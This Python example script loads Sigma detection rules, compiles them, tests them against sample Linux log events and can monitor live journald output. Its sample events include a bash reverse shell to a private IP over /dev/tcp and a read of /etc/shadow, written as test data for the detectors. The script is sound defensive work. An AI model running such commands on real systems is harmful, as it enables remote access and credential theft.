#!/usr/bin/env python3
"""
Real Sigma Rules Integration Example

This example demonstrates how to use the Sigma Simple Backend with
real Sigma rules instead of the mock rules.

Requirements:
- PyYAML (pip install pyyaml)
- Official Sigma rules (git clone https://github.com/SigmaHQ/sigma.git)

Usage:
    python real_sigma_rules.py
    python real_sigma_rules.py --rules-path /path/to/sigma/rules/linux/
"""

import json
import os
import sys
import glob
import argparse
import subprocess
from pathlib import Path

# Add parent directory to path to import sigma_simple_backend
sys.path.insert(0, str(Path(__file__).parent.parent))

from sigma_simple_backend import SimpleEvalBackend, RestrictivenessLevel

try:
    import yaml
except ImportError:
    print("Error: PyYAML is required for loading Sigma rules.")
    print("Install it with: pip install pyyaml")
    sys.exit(1)


class SigmaRuleLoader:
    """Load and parse Sigma rules from YAML files"""

    def __init__(self):
        self.rules = []
        self.load_errors = []

    def load_rule_file(self, rule_file_path):
        """Load a single Sigma rule file"""
        try:
            with open(rule_file_path, "r", encoding="utf-8") as f:
                documents = yaml.safe_load_all(f.read())

                for doc in documents:
                    if doc and isinstance(doc, dict):
                        rule = self._convert_sigma_rule(doc)
                        if rule:
                            self.rules.append(rule)

        except Exception as e:
            self.load_errors.append(f"{rule_file_path}: {e}")

    def _convert_sigma_rule(self, rule_data):
        """Convert Sigma YAML rule to SimpleRule format"""
        if not rule_data.get("title"):
            return None

        # Extract MITRE ATT&CK information from tags
        tags = rule_data.get("tags", [])
        mitre_tactics = []
        mitre_techniques = []

        for tag in tags:
            if isinstance(tag, str):
                if tag.startswith("attack."):
                    if tag.startswith("attack.t") and len(tag) > 8:
                        # MITRE technique (e.g., attack.t1059)
                        mitre_techniques.append(tag.replace("attack.", "").upper())
                    else:
                        # MITRE tactic (e.g., attack.execution)
                        tactic = tag.replace("attack.", "").replace("_", " ").title()
                        if tactic not in mitre_tactics:
                            mitre_tactics.append(tactic)

        rule = type(
            "SimpleRule",
            (),
            {
                "title": rule_data.get("title", ""),
                "id": rule_data.get("id", ""),
                "description": rule_data.get("description", ""),
                "level": rule_data.get("level", "medium"),
                "tags": tags,
                "detection": rule_data.get("detection", {}),
                "mitre_tactics": mitre_tactics,
                "mitre_techniques": mitre_techniques,
            },
        )()

        return rule

    def load_rules_directory(self, rules_dir):
        """Load all .yml and .yaml files from a directory"""
        if not os.path.exists(rules_dir):
            print(f"Error: Rules directory '{rules_dir}' does not exist")
            return

        pattern_yml = os.path.join(rules_dir, "**", "*.yml")
        pattern_yaml = os.path.join(rules_dir, "**", "*.yaml")

        rule_files = glob.glob(pattern_yml, recursive=True) + glob.glob(
            pattern_yaml, recursive=True
        )

        print(f"Loading Sigma rules from {len(rule_files)} files...")

        for rule_file in rule_files:
            self.load_rule_file(rule_file)

        print(f"Successfully loaded {len(self.rules)} Sigma rules")
        if self.load_errors:
            print(f"Encountered {len(self.load_errors)} loading errors")


class RealSigmaDemo:
    """Demonstration of using real Sigma rules"""

    def __init__(self, rules_path, restrictiveness=RestrictivenessLevel.BALANCED):
        self.rules_path = rules_path
        self.backend = SimpleEvalBackend(restrictiveness=restrictiveness)
        self.compiled_rules = []

        # Load real Sigma rules
        self.rule_loader = SigmaRuleLoader()
        self.load_rules()

    def load_rules(self):
        """Load and compile Sigma rules"""
        print(f"Loading Sigma rules from: {self.rules_path}")

        if os.path.isfile(self.rules_path):
            # Single file
            self.rule_loader.load_rule_file(self.rules_path)
        else:
            # Directory
            self.rule_loader.load_rules_directory(self.rules_path)

        if not self.rule_loader.rules:
            print("No Sigma rules loaded. Check your rules path.")
            return

        # Compile rules
        print("Compiling Sigma rules...")
        self.compiled_rules = self.backend.compile(self.rule_loader)
        print(f"Compiled {len(self.compiled_rules)} rules for detection")

    def test_sample_events(self):
        """Test the loaded rules against sample events"""
        print("\n" + "=" * 60)
        print("Testing Sample Events Against Real Sigma Rules")
        print("=" * 60)

        # Sample test events (typical Linux events)
        test_events = [
            {
                "MESSAGE": "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
                "_COMM": "bash",
                "_CMDLINE": "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
                "description": "Reverse shell attempt",
            },
            {
                "MESSAGE": "sudo su - root",
                "_COMM": "sudo",
                "_CMDLINE": "sudo su - root",
                "description": "Privilege escalation attempt",
            },
            {
                "MESSAGE": "cat /etc/shadow",
                "_COMM": "cat",
                "_CMDLINE": "cat /etc/shadow",
                "description": "Credential theft attempt",
            },
            {
                "MESSAGE": "nmap -sS -O 192.168.1.0/24",
                "_COMM": "nmap",
                "_CMDLINE": "nmap -sS -O 192.168.1.0/24",
                "description": "Network scanning",
            },
            {
                "MESSAGE": "ls -la /home/user",
                "_COMM": "ls",
                "_CMDLINE": "ls -la /home/user",
                "description": "Normal directory listing (should not alert)",
            },
        ]

        for i, event in enumerate(test_events, 1):
            print(f"\nTest Event {i}: {event['description']}")
            print(f"Command: {event.get('_CMDLINE', 'N/A')}")

            alerts = self.test_event(event)

            if alerts:
                print(f"🚨 Generated {len(alerts)} alert(s):")
                for alert in alerts:
                    print(f"  - {alert.rule_title} (Severity: {alert.severity})")
                    if alert.mitre_techniques:
                        print(f"    MITRE: {', '.join(alert.mitre_techniques)}")
            else:
                print("✅ No alerts (clean)")

    def test_event(self, event):
        """Test a single event against all compiled rules"""
        alerts = []

        for rule_func in self.compiled_rules:
            try:
                alert = self.backend.test_rule_against_event(rule_func, event)
                if alert:
                    alerts.append(alert)
            except Exception as e:
                # Skip rules that can't be evaluated
                continue

        return alerts

    def monitor_live_events(self):
        """Monitor live system events (requires root/appropriate permissions)"""
        print("\n" + "=" * 60)
        print("Live Event Monitoring (Press Ctrl+C to stop)")
        print("=" * 60)

        try:
            # Monitor journald events
            process = subprocess.Popen(
                ["journalctl", "-o", "json", "-f", "-n", "0"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
            )

            print("Monitoring system events with Sigma rules...")

            for line in process.stdout:
                try:
                    event = json.loads(line.strip())

                    alerts = self.test_event(event)

                    if alerts:
                        print(f"\n🚨 LIVE ALERT:")
                        for alert in alerts:
                            print(f"  Rule: {alert.rule_title}")
                            print(f"  Severity: {alert.severity}")
                            print(f"  Event: {event.get('MESSAGE', '')[:100]}...")
                            print("-" * 40)

                except json.JSONDecodeError:
                    continue
                except KeyboardInterrupt:
                    break

        except FileNotFoundError:
            print("Error: journalctl not found. Live monitoring requires systemd.")
        except KeyboardInterrupt:
            print("\nLive monitoring stopped.")

    def show_rule_statistics(self):
        """Show statistics about loaded rules"""
        print("\n" + "=" * 60)
        print("Sigma Rules Statistics")
        print("=" * 60)

        if not self.rule_loader.rules:
            print("No rules loaded.")
            return

        # Count by severity
        severity_counts = {}
        tactic_counts = {}

        for rule in self.rule_loader.rules:
            # Count severities
            level = getattr(rule, "level", "unknown")
            severity_counts[level] = severity_counts.get(level, 0) + 1

            # Count MITRE tactics
            for tactic in getattr(rule, "mitre_tactics", []):
                tactic_counts[tactic] = tactic_counts.get(tactic, 0) + 1

        print(f"Total Rules: {len(self.rule_loader.rules)}")
        print(f"Compiled Rules: {len(self.compiled_rules)}")

        print("\nSeverity Distribution:")
        for severity, count in sorted(severity_counts.items()):
            print(f"  {severity}: {count}")

        if tactic_counts:
            print("\nTop MITRE ATT&CK Tactics:")
            for tactic, count in sorted(
                tactic_counts.items(), key=lambda x: x[1], reverse=True
            )[:10]:
                print(f"  {tactic}: {count}")

        if self.rule_loader.load_errors:
            print(f"\nLoad Errors: {len(self.rule_loader.load_errors)}")
            for error in self.rule_loader.load_errors[:5]:
                print(f"  {error}")


def main():
    parser = argparse.ArgumentParser(
        description="Real Sigma Rules Integration Example",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python real_sigma_rules.py
  python real_sigma_rules.py --rules-path /path/to/sigma/rules/linux/
  python real_sigma_rules.py --live-monitor
  python real_sigma_rules.py --restrictiveness ULTRA_RESTRICTIVE
        """,
    )

    parser.add_argument(
        "--rules-path",
        default="./sigma-rules",
        help="Path to Sigma rules directory or file (default: ./sigma-rules)",
    )

    parser.add_argument(
        "--restrictiveness",
        choices=["PERMISSIVE", "BALANCED", "RESTRICTIVE", "ULTRA_RESTRICTIVE"],
        default="BALANCED",
        help="Detection restrictiveness level (default: BALANCED)",
    )

    parser.add_argument(
        "--live-monitor", action="store_true", help="Enable live event monitoring"
    )

    parser.add_argument(
        "--download-rules", action="store_true", help="Download official Sigma rules"
    )

    args = parser.parse_args()

    # Download rules if requested
    if args.download_rules:
        print("Downloading official Sigma rules...")
        try:
            subprocess.run(
                [
                    "git",
                    "clone",
                    "--depth",
                    "1",
                    "https://github.com/SigmaHQ/sigma.git",
                    "sigma-rules",
                ],
                check=True,
            )
            print("Sigma rules downloaded to './sigma-rules'")
            args.rules_path = "sigma-rules/rules/linux"
        except subprocess.CalledProcessError:
            print(
                "Error downloading Sigma rules. Please install git or download manually."
            )
            return 1

    # Check if rules path exists
    if not os.path.exists(args.rules_path):
        print(f"Error: Rules path '{args.rules_path}' does not exist.")
        print("Options:")
        print("  1. Use --download-rules to download official Sigma rules")
        print("  2. Specify existing rules path with --rules-path")
        print("  3. Clone Sigma rules: git clone https://github.com/SigmaHQ/sigma.git")
        return 1

    # Convert restrictiveness string to enum
    restrictiveness = getattr(RestrictivenessLevel, args.restrictiveness)

    # Initialize demo
    demo = RealSigmaDemo(args.rules_path, restrictiveness)

    if not demo.compiled_rules:
        print("No rules could be compiled. Please check your rules path.")
        return 1

    # Show statistics
    demo.show_rule_statistics()

    # Test sample events
    demo.test_sample_events()

    # Live monitoring if requested
    if args.live_monitor:
        demo.monitor_live_events()

    print("\nDone! This example shows how to integrate real Sigma rules.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
